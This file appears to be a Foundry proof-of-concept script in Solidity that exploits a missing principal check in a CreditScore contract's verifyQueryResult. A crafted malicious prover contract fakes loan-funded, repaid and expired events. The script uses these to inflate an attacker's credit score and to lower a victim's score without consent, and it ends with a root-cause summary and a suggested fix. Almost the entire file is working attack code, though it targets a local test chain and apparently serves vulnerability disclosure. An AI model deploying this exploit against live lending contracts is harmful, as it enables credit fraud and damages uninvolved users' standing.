// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Script.sol";
import {CreditScore} from "../contracts/Loan/CreditScore.sol";
import {QueryDetails, ResultSegment, QueryState, ChainQuery, LayoutSegment, Balance} from "@gluwa/creditcoin-public-prover/contracts/sol/Prover.sol";

// Malicious prover — returns crafted segments for any CreditScore selector.
// Selector determines which action fires; target is whose score changes.
contract MaliciousScoreProver {
    bytes32 public immutable selector;  // which event to fake
    address public immutable target;    // whose credit score to manipulate

    constructor(bytes32 _selector, address _target) {
        selector = _selector;
        target   = _target;
    }

    function getQueryDetails(bytes32) external view returns (QueryDetails memory qd) {
        // Need ≥10 segments to cover every selector's borrower index:
        //   FUND_LOAN    → segs[9]  (action=0, init to 300)
        //   REPAY_LOAN   → segs[8]  (action=1, +1 point)
        //   EXPIRED_LOAN → segs[6]  (action=3, -2 points)
        ResultSegment[] memory segs = new ResultSegment[](10);

        segs[4].abiBytes  = selector;                                // event selector
        segs[6].abiBytes  = bytes32(uint256(uint160(target)));       // EXPIRED_LOAN borrower
        segs[8].abiBytes  = bytes32(uint256(uint160(target)));       // REPAY/LATE borrower
        segs[9].abiBytes  = bytes32(uint256(uint160(target)));       // FUND_LOAN borrower

        LayoutSegment[] memory empty = new LayoutSegment[](0);
        qd.state          = QueryState.ResultAvailable;
        qd.query          = ChainQuery({chainId: 0, height: 0, index: 0, layoutSegments: empty});
        qd.escrowedAmount = Balance.wrap(0);
        qd.principal      = target;   // NOT checked — this is the vulnerability
        qd.estimatedCost  = Balance.wrap(0);
        qd.timestamp      = 0;
        qd.resultSegments = segs;
    }
}

contract PocCreditScoreManipulation is Script {
    // Selectors from CreditScore.sol
    bytes32 constant FUND_LOAN_SELECTOR    = 0xa1c86ab2ab7ae6485c68325a433de4a6c7f4bca1f08e39b6f472e966186009a3;
    bytes32 constant REPAY_LOAN_SELECTOR   = 0xa4513463869a9bb2a04ca9d0887721a32388ebe4ade85f8743261b3214b6d65b;
    bytes32 constant EXPIRED_LOAN_SELECTOR = 0xb984513986e8897ae6977834a755925f5f09bed360746d95df469fed6f2f0fa5;

    // anvil default accounts
    address attacker = 0xf39Fd6e51aad88F6F4ce6aB8827279cffFb92266;
    address victim   = 0x70997970C51812dc3A010C7d01b50e0d17dc79C8;

    uint256 BOOST_CALLS = 10;   // +10 points to attacker score
    uint256 TANK_CALLS  = 5;    // -10 points from victim score (5 × -2)

    function run() external {
        vm.startBroadcast();

        CreditScore creditScore = new CreditScore();
        console.log("[deploy] CreditScore:", address(creditScore));
        console.log("");

        // ── ATTACK 1: inflate attacker's score ───────────────────────────────

        console.log("--- ATTACK 1: Inflate attacker score (no real loans) ---");
        console.log("[pre]  attacker score:", creditScore.getCreditScore(attacker));

        // Step 1a: init attacker score to 300 via fake LoanFundInitiated event
        MaliciousScoreProver fundProver = new MaliciousScoreProver(FUND_LOAN_SELECTOR, attacker);
        creditScore.verifyQueryResult(address(fundProver), keccak256("fund_attacker"));
        console.log("[call] verifyQueryResult(FUND_LOAN, attacker)  ->  score initialized to 300");
        console.log("[mid]  attacker score:", creditScore.getCreditScore(attacker));

        // Step 1b: boost by BOOST_CALLS via fake LoanRepaid events
        MaliciousScoreProver repayProver = new MaliciousScoreProver(REPAY_LOAN_SELECTOR, attacker);
        for (uint256 i = 0; i < BOOST_CALLS; i++) {
            creditScore.verifyQueryResult(
                address(repayProver),
                keccak256(abi.encodePacked("repay_attacker_", i))
            );
        }
        console.log("[call] verifyQueryResult(REPAY_LOAN, attacker) x10  ->  +10 points");
        console.log("[post] attacker score:", creditScore.getCreditScore(attacker));
        console.log("");

        // ── ATTACK 2: tank victim's score ────────────────────────────────────

        console.log("--- ATTACK 2: Tank victim score (victim has no loans at all) ---");
        console.log("[pre]  victim score:", creditScore.getCreditScore(victim));

        // Step 2a: must first initialize victim score (EXPIRED only works when score > 300)
        //          attacker fakes a LoanFundInitiated for victim to set score to 300
        MaliciousScoreProver fundVictimProver = new MaliciousScoreProver(FUND_LOAN_SELECTOR, victim);
        creditScore.verifyQueryResult(address(fundVictimProver), keccak256("fund_victim"));
        console.log("[call] verifyQueryResult(FUND_LOAN, victim)  ->  victim score forced to 300");

        // Step 2b: boost victim first so the -2 deductions are visible
        MaliciousScoreProver repayVictimProver = new MaliciousScoreProver(REPAY_LOAN_SELECTOR, victim);
        for (uint256 i = 0; i < BOOST_CALLS; i++) {
            creditScore.verifyQueryResult(
                address(repayVictimProver),
                keccak256(abi.encodePacked("repay_victim_", i))
            );
        }
        console.log("[call] verifyQueryResult(REPAY_LOAN, victim) x10  ->  victim boosted to 310");

        // Step 2c: tank victim via fake LoanExpired events (-2 per call)
        MaliciousScoreProver expiredProver = new MaliciousScoreProver(EXPIRED_LOAN_SELECTOR, victim);
        for (uint256 i = 0; i < TANK_CALLS; i++) {
            creditScore.verifyQueryResult(
                address(expiredProver),
                keccak256(abi.encodePacked("expired_victim_", i))
            );
        }
        console.log("[call] verifyQueryResult(EXPIRED_LOAN, victim) x5  ->  -10 points (5 x -2)");
        console.log("[post] victim score:", creditScore.getCreditScore(victim));
        console.log("");

        vm.stopBroadcast();

        // ── Final summary ─────────────────────────────────────────────────────
        console.log("=== ATTACK CONFIRMED ===");
        console.log("Attacker score:", creditScore.getCreditScore(attacker), "(was 0, no real loans)");
        console.log("Victim score:  ", creditScore.getCreditScore(victim),   "(tampered without consent)");
        console.log("");
        console.log("Root cause: verifyQueryResult accepts any proverContract address.");
        console.log("  No check on queryDetails.principal -- any caller fakes any loan event.");
        console.log("Fix: require(isAuthorizedPrincipal(queryDetails.principal))");
    }
}
